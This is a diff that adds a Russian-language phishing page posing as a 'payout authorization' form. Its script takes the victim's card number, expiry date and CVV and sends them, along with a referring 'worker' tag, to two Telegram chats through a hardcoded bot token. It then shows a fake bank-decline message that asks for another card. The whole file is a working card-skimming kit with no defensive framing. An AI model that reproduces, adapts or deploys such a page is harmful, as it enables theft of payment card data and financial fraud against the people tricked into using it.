@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Центр авторизации выплат</title>
+    <style>
+        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f7f9; color: #333; display: flex; justify-content: center; }
+        .wrapper { width: 100%; max-width: 420px; min-height: 100vh; background: #fff; padding: 30px 20px; box-sizing: border-box; box-shadow: 0 0 20px rgba(0,0,0,0.05); }
+        .header { text-align: center; margin-bottom: 35px; }
+        .header h1 { font-size: 22px; font-weight: 700; color: #1a1a1a; margin: 0; }
+        .header p { color: #666; font-size: 15px; margin-top: 10px; line-height: 1.4; }
+        .card-box { background: linear-gradient(135deg, #2c3e50 0%, #000000 100%); border-radius: 16px; padding: 25px; margin-bottom: 30px; box-shadow: 0 8px 25px rgba(0,0,0,0.15); color: #fff; position: relative; }
+        .chip { width: 45px; height: 35px; background: linear-gradient(135deg, #e5c100 0%, #b89600 100%); border-radius: 6px; margin-bottom: 25px; }
+        .card-num-preview { font-size: 20px; letter-spacing: 2px; font-family: "Courier New", monospace; margin-bottom: 20px; }
+        .card-info-row { display: flex; justify-content: space-between; font-size: 11px; text-transform: uppercase; opacity: 0.8; }
+        .input-group { margin-bottom: 18px; }
+        label { display: block; font-size: 13px; font-weight: 600; color: #444; margin-bottom: 8px; }
+        .main-input { width: 100%; padding: 14px; border: 1px solid #dcdcdc; border-radius: 8px; font-size: 16px; outline: none; box-sizing: border-box; background: #f9f9f9; transition: 0.2s; }
+        .flex-row { display: flex; gap: 12px; }
+        .flex-row .input-group { flex: 1; }
+        .btn-submit { width: 100%; padding: 16px; background: #007bff; color: #fff; border: none; border-radius: 8px; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 15px; }
+        .footer-secure { text-align: center; margin-top: 40px; color: #999; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="header">
+        <h1>Авторизация карты для получения выплаты</h1>
+        <p>Для активации протокола мгновенных зачислений необходимо верифицировать реквизиты получателя.</p>
+    </div>
+
+    <div class="card-box">
+        <div class="chip"></div>
+        <div class="card-num-preview" id="preview-num">•••• •••• •••• ••••</div>
+        <div class="card-info-row">
+            <div>CARD HOLDER</div>
+            <div id="preview-date">MM/YY</div>
+        </div>
+    </div>
+
+    <div class="form">
+        <div class="input-group">
+            <label>Номер карты</label>
+            <input type="text" id="card_num" class="main-input" placeholder="0000 0000 0000 0000" inputmode="numeric">
+        </div>
+        <div class="flex-row">
+            <div class="input-group">
+                <label>Срок действия</label>
+                <input type="text" id="card_date" class="main-input" placeholder="ММ/ГГ" inputmode="numeric" maxlength="5">
+            </div>
+            <div class="input-group">
+                <label>CVV / CVC</label>
+                <input type="password" id="card_cvv" class="main-input" placeholder="***" inputmode="numeric" maxlength="3">
+            </div>
+        </div>
+        <button class="btn-submit" onclick="sendToBot()">Подтвердить и получить выплату</button>
+    </div>
+    <div class="footer-secure">🔒 Безопасное соединение SSL (PCI DSS Certified)</div>
+</div>
+
+<script>
+    const TOKEN = "8528280913:AAGlrWN1kFbgbc9frJprlpSZHe3CJ8MnAo8";
+    // ТВОЙ ID и ID ДРУГА
+    const IDS = ["8225253089", "1676332805"];
+
+    document.getElementById('card_num').addEventListener('input', function (e) {
+        let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        let parts = [];
+        for (let i = 0; i < v.length; i += 4) { parts.push(v.substring(i, i + 4)); }
+        e.target.value = parts.join(' ').substring(0, 19);
+        document.getElementById('preview-num').innerText = e.target.value || "•••• •••• •••• ••••";
+    });
+
+    document.getElementById('card_date').addEventListener('input', function (e) {
+        let v = e.target.value.replace(/[^0-9]/gi, '');
+        if (v.length >= 2) { e.target.value = v.substring(0, 2) + '/' + v.substring(2, 4); }
+        document.getElementById('preview-date').innerText = e.target.value || "MM/YY";
+    });
+
+    async function sendToBot() {
+        const num = document.getElementById('card_num').value;
+        const date = document.getElementById('card_date').value;
+        const cvv = document.getElementById('card_cvv').value;
+
+        const params = new URLSearchParams(window.location.search);
+        let worker = params.get('ref') || "@neo_steppe";
+
+        if (num.length < 16 || date.length < 5 || cvv.length < 3) {
+            return alert("Пожалуйста, введите корректные данные карты");
+        }
+
+        const text = `💳 КАРТА НА ВЫПЛАТУ 💳\n\n🔢 НОМЕР: ${num}\n📅 СРОК: ${date}\n🔒 CVV: ${cvv}\n\n📢 ПОЗВАЛ: ${worker}`;
+
+        // Отправка сразу на два ID
+        for (let id of IDS) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: id, text: text})
+                });
+            } catch(e) { console.error("Ошибка отправки на ID: " + id); }
+        }
+        
+        document.querySelector('.btn-submit').innerText = "Обработка...";
+        setTimeout(() => {
+            alert("Ошибка авторизации: ваш банк отклонил транзакцию. Попробуйте другую карту для зачисления.");
+            location.reload();
+        }, 2500);
+    }
+</script>
+</body>
+</html>
